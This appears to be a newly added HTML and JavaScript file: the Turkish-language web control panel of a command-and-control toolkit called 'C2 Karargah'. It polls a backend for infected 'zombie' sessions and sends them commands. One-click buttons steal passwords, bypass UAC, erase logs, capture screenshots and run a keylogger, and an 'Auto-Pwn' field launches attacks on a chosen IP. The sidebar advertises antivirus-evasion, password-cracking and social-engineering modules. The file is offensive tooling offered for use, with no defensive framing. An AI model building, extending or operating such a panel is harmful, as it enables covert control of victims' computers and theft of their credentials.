@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Karargah - Elite Dashboard</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <header class="glass-panel">
+        <div class="logo">
+            <h1>C2 <span>Karargah</span></h1>
+        </div>
+        <div class="status-bar">
+            <div class="status-badge">
+                <div id="status-indicator" class="indicator"></div>
+                <span id="status-text">Dinleyici Kapalı</span>
+            </div>
+            <div class="status-badge">
+                Zombi Sayısı: <strong id="zombi-count" style="color:var(--primary)">0</strong>
+            </div>
+        </div>
+    </header>
+
+    <div class="dashboard-grid">
+        <!-- Sidebar -->
+        <div class="sidebar glass-panel">
+            <h2>Hızlı İşlemler</h2>
+            
+            <div class="input-group">
+                <input type="number" id="listen-port" value="443" placeholder="Port">
+                <button class="btn btn-primary" onclick="startListener()">Dinle</button>
+            </div>
+
+            <h2>Oto-Pwn Motoru</h2>
+            <div class="input-group">
+                <input type="text" id="target-ip" placeholder="Hedef IP">
+                <button class="btn btn-primary" onclick="startAutoPwn()">Saldır</button>
+            </div>
+
+            <h2>Kategoriler</h2>
+            <button class="btn" onclick="logMsg('Lütfen bu araçları terminaldeki C2_Karargah.py menüsünden kullanın. Web üzerinden C2 kontrolü aktiftir.')">01_Antivirus_Atlatma</button>
+            <button class="btn" onclick="logMsg('Terminalden kullanın.')">04_Ag_Kesif_Araclari</button>
+            <button class="btn" onclick="logMsg('Terminalden kullanın.')">06_Sifre_Kirici</button>
+            <button class="btn" onclick="logMsg('Terminalden kullanın.')">10_Sosyal_Muhendislik</button>
+            <button class="btn" onclick="logMsg('Terminalden kullanın.')">12_Web_Zafiyet</button>
+        </div>
+
+        <!-- Main Area -->
+        <div class="main-area">
+            
+            <!-- Zombiler -->
+            <div class="glass-panel zombi-list" id="zombi-list-container">
+                <h2 style="color:var(--secondary); font-family:'Orbitron'; margin-bottom:15px;">Aktif Bağlantılar (Zombiler)</h2>
+                <div id="zombi-list">
+                    <p style="color:#666">Henüz bağlantı yok...</p>
+                </div>
+            </div>
+
+            <!-- Terminal -->
+            <div class="glass-panel terminal-container">
+                <div class="terminal-header">
+                    <span class="terminal-title" id="term-title">Web Terminali - Bağlantı Seçilmedi</span>
+                    <button class="cmd-btn" style="border-color:red; color:red;" onclick="sendCommand('!PANIK')">☠️ PANİK (Kill-Switch)</button>
+                </div>
+                <div class="terminal-output" id="terminal-output">C2 Karargah Web Arayüzüne Hoş Geldiniz...
+Bir zombi seçin ve komut göndermeye başlayın.</div>
+                
+                <div class="quick-commands">
+                    <button class="cmd-btn" onclick="sendCommand('whoami')">whoami</button>
+                    <button class="cmd-btn" onclick="sendCommand('sysinfo')">sysinfo</button>
+                    <button class="cmd-btn" onclick="sendCommand('!screenshot')">📸 Screenshot</button>
+                    <button class="cmd-btn" onclick="sendCommand('!steal_passwords')">🔑 Şifreleri Çal</button>
+                    <button class="cmd-btn" onclick="sendCommand('!getsystem')">👑 UAC Bypass</button>
+                    <button class="cmd-btn" onclick="sendCommand('!clear_logs')">🧹 İzleri Sil</button>
+                    <button class="cmd-btn" onclick="sendCommand('!keylog_start')">⌨️ Keylogger Başlat</button>
+                    <button class="cmd-btn" onclick="sendCommand('!keylog_dump')">⌨️ Keylog Oku</button>
+                </div>
+
+                <div class="terminal-input-wrapper" style="margin-top:15px;">
+                    <span style="color:var(--primary); padding:10px 0;">C2></span>
+                    <input type="text" id="term-input" class="terminal-input" placeholder="Komut yazın... (!upload dosya.exe | !download dosya.txt)" onkeypress="handleEnter(event)">
+                    <button class="btn btn-primary" style="width:100px" onclick="sendInputCmd()">Gönder</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let currentSession = null;
+
+        function logMsg(msg, isErr=false) {
+            const out = document.getElementById('terminal-output');
+            const color = isErr ? 'red' : '#0f0';
+            out.innerHTML += `\n<span style="color:${color}">${msg}</span>`;
+            out.scrollTop = out.scrollHeight;
+        }
+
+        async function startListener() {
+            const port = document.getElementById('listen-port').value;
+            logMsg(`[*] Dinleyici ${port} portunda başlatılıyor...`);
+            try {
+                const res = await fetch('/api/start_listener', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({port: port})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    document.getElementById('status-indicator').className = 'indicator active';
+                    document.getElementById('status-text').innerText = `Dinleniyor (${port})`;
+                    logMsg(`[+] ${data.message}`);
+                } else {
+                    logMsg(`[-] Hata: ${data.message}`, true);
+                }
+            } catch(e) { logMsg(`[-] İstek hatası: ${e}`, true); }
+        }
+
+        async function startAutoPwn() {
+            const ip = document.getElementById('target-ip').value;
+            if(!ip) return alert('Hedef IP girin!');
+            logMsg(`[*] Auto-Pwn ${ip} için başlatıldı. Arka planda çalışıyor...`);
+            try {
+                await fetch('/api/autopwn', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({target: ip})
+                });
+            } catch(e) {}
+        }
+
+        async function updateSessions() {
+            try {
+                const res = await fetch('/api/sessions');
+                const data = await res.json();
+                const list = document.getElementById('zombi-list');
+                document.getElementById('zombi-count').innerText = data.sessions.length;
+                
+                if(data.sessions.length === 0) {
+                    list.innerHTML = '<p style="color:#666">Henüz bağlantı yok...</p>';
+                } else {
+                    let html = '';
+                    data.sessions.forEach(s => {
+                        html += `
+                            <div class="zombi-card">
+                                <div>
+                                    <strong style="color:#fff">ID: ${s.id}</strong><br>
+                                    <span style="color:#888; font-size:0.8rem">${s.ip}:${s.port}</span>
+                                </div>
+                                <button class="btn" style="width:auto; padding:5px 15px; border-color:var(--secondary)" onclick="selectSession(${s.id}, '${s.ip}')">Bağlan</button>
+                            </div>
+                        `;
+                    });
+                    list.innerHTML = html;
+                }
+            } catch(e) {}
+        }
+
+        function selectSession(id, ip) {
+            currentSession = id;
+            document.getElementById('term-title').innerText = `Web Terminali - Zombi [${id}] (${ip})`;
+            logMsg(`\n[+] Zombi ${id} seçildi. Komut göndermeye hazır.`);
+        }
+
+        async function sendCommand(cmd) {
+            if(currentSession === null) {
+                logMsg(`[-] Önce sol menüden bir Zombi seçin.`, true);
+                return;
+            }
+            logMsg(`\nZombi-${currentSession}> ${cmd}`, false);
+            
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({session_id: currentSession, command: cmd})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    logMsg(data.output);
+                } else {
+                    logMsg(data.message, true);
+                    if(data.message.includes('koptu') || data.message.includes('kesildi')) {
+                        currentSession = null;
+                        document.getElementById('term-title').innerText = `Web Terminali - Bağlantı Yok`;
+                    }
+                }
+            } catch(e) {
+                logMsg(`[-] İletişim Hatası: ${e}`, true);
+            }
+            updateSessions();
+        }
+
+        function handleEnter(e) {
+            if(e.key === 'Enter') sendInputCmd();
+        }
+
+        function sendInputCmd() {
+            const el = document.getElementById('term-input');
+            const cmd = el.value.trim();
+            if(cmd) {
+                sendCommand(cmd);
+                el.value = '';
+            }
+        }
+
+        // Poll sessions every 3 seconds
+        setInterval(updateSessions, 3000);
+        updateSessions();
+    </script>
+</body>
+</html>
